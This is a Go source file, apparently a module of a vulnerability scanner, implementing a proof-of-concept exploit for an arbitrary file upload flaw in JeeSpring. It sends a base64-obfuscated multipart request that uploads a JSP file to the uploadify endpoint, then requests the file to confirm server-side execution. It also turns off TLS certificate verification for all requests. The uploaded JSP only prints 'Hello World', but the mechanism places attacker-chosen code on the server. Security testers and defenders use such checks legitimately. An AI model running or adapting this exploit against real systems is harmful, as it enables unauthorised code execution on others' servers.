package exppackage

import (
	"encoding/base64"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"ssp/common"
	"strings"
)

func JeeSpring_2023(url, proxyURL string) {
	Header := map[string]string{
		"User-Agent":      common.GetRandomUserAgent(),
		"Content-Type":    "multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL",
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
		"Connection":      "close",
	}

	payload2 := []byte(`LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo=`)
	payload, err := base64.StdEncoding.DecodeString(string(payload2))
	if err != nil {
		fmt.Println("Error decoding payload:", err)
		return
	}

	path := "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"

	http.DefaultTransport.(*http.Transport).TLSClientConfig.InsecureSkipVerify = true

	resp, body, err := common.MakeRequest(url+path, "POST", proxyURL, Header, string(payload))
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	code := resp.StatusCode
	if strings.Contains(string(body), "jsp") && code == 200 {
		fmt.Println("[+] Payload已经发送，成功上传JSP")
		newpath := strings.TrimSpace(string(body))
		urltest := url + "static/uploadify/" + newpath

		retest, bodytest, err := common.MakeRequest(urltest, "GET", proxyURL, nil, "")
		if err != nil {
			color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
			return
		}

		code2 := retest.StatusCode
		if strings.Contains(string(bodytest), "Hello") && code2 == 200 {
			common.PrintVulnerabilityConfirmation("JeeSpring_2023任意文件上传漏洞", url, "Null", "7")
			fmt.Println(urltest)
		} else {
			color.Yellow("[.] 未发现Poc存活，请手动验证： %s\n", urltest)
		}
	} else {
		color.Yellow("[-] %s 未发现2023JeeSpring任意文件上传漏洞\n", url)
	}
}
